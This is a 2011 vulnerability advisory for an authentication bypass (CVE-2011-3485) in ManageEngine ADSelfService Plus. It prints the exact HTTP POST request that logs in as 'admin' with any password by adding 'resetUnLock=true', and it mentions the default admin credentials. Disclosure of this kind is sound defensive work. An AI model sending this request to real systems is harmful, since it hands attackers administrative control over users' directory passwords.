==========================================================

[ADVISORY INFORMATION]
Title:		ZOHO ManageEngine ADSelfService Plus Administrative Access
Release date: 	10/10/2011
Last update: 	10/10/2011

[VULNERABILITY INFORMATION]
Class: 	       Authentication issue, Administrative access
CVE: 	       CVE-2011-3485

[AFFECTED SOFTWARE]
    * ADSelfService Plus 4.5 Build 4521
Previous versions are probably also vulnerable, but they were not checked.

[VULNERABILITY DETAILS]
ManageEngine ADSelfService Plus is a web-based password management
infrastructure for Microsoft Windows Active Directory environments.

By default a local administrative account is configured, named "admin". The
administrative password is stored inside the local database in base64(md5(P|S))
form (P is the plain-text password, S is a password salt, and '|' is the string
concatenation operator). In the default installation, password for user "admin"
is also "admin", but the password can be changed after first login.

Unfortunately, due to a bug in the authentication procedure, malicious users
can authenticate without knowing the current plain-text password value.

Normal logins are eventually performed through POST requests similar to the
following:

<cut>
POST /j_security_check HTTP/1.1
Host: ...
Content-Length: ...

j_username=user&j_password=pass&domainName=domain&DIGEST=captcha&AUTHRULE_NAME=ADAuthenticator&domainAuthen=true
</cut>

However, due to a software defect, if a malicious user tries to log as the
"admin" user and adds to the POST body an additional parameter named
"resetUnLock" with value "true", then the application skips the password check
(i.e., you can supply any password and login succeeds).

As an example, an attacker can issue the following POST request to authenticate
as the "admin" user:

<cut>
POST /j_security_check HTTP/1.1
Host: ...
Content-Length: ...

j_username=admin&j_password=any&domainName=domain&DIGEST=captcha&AUTHRULE_NAME=ADAuthenticator&domainAuthen=true&resetUnLock=true
</cut>

[REMEDIATION]
Zoho included a fix to address this issue in ADSelfService Plus Build
4522. Emaze would like to thanks D. Ashok Kumar, of the ManageEngine
ADSelfService Plus team, for having coordinated the vulnerability handling
process.
